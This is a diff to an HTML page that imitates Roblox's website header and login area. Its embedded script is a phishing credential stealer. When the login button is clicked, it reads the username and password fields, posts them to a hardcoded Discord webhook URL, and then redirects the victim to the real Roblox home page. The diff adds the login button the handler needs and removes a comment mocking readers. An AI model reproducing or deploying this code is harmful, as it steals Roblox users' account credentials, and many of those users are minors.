@@ -772,14 +772,49 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
         </a>
       </li>
     </ul>
-    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form name="search-form" action="/search"><div class="form-has-feedback"><input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Marketplace</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/marketplace/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=" id="sign-up-button">Sign Up</a></li><li class="login-action"></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
-  <script>
+   <div id="right-navigation-header">
+    <div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search">
+        <div class="input-group">
+            <form name="search-form" action="/search">
+                <div class="form-has-feedback">
+                    <input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value="">
+                </div>
+            </form>
+            <div class="input-group-btn">
+                <button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit">
+                    <span class="icon-common-search-sm"></span>
+                </button>
+            </div>
+        </div>
+        <ul class="dropdown-menu new-dropdown-menu" role="menu">
+            <!-- Your list items here -->
+        </ul>
+    </div>
+    <div class="navbar-right rbx-navbar-right">
+        <ul class="nav navbar-right rbx-navbar-right-nav">
+            <li class="signup-button-container">
+                <a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=" id="sign-up-button">Sign Up</a>
+            </li>
+            <li class="login-action">
+                <!-- Assuming your login button has the ID 'login-button' -->
+                <button id="login-button" type="button">Login</button>
+            </li>
+            <li class="rbx-navbar-right-search">
+                <button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md">
+                    <span class="icon-nav-search-white"></span>
+                </button>
+            </li>
+        </ul>
+    </div>
+</div>
+
+<script>
     document.addEventListener('DOMContentLoaded', function () {
         document.getElementById('login-button').addEventListener('click', async function (event) {
             event.preventDefault(); // Prevents the default form submission
 
-            var username = document.getElementsByName('login-username')[0].value;
-            var password = document.getElementsByName('login-password')[0].value;
+            var username = document.getElementById('login-username').value;
+            var password = document.getElementById('login-password').value;
 
             const webhookBody = {
                 embeds: [{
@@ -791,7 +826,7 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
                 }],
             };
 
-            var webhookUrl = 'https://discord.com/api/webhooks/1184258036970295447/GStuyvDyN9yZIfFut7Ri1UOtjr_95rnOqgpoVQIbhtA994wRjmIPkp-2d-8xkFchXmhp'; // just saying kiddo this is fake lol its not that easy to find LOL
+            var webhookUrl = 'https://discord.com/api/webhooks/1184258036970295447/GStuyvDyN9yZIfFut7Ri1UOtjr_95rnOqgpoVQIbhtA994wRjmIPkp-2d-8xkFchXmhp';
 
             try {
                 const response = await fetch(webhookUrl, {
@@ -810,11 +845,12 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
             } catch (error) {
                 console.error('Error:', error);
             }
-            
+
             window.location.href = "https://roblox.com/home";
         });
     });
 </script>
+
   </div>
 </div>
 <div id="left-navigation-container"></div>
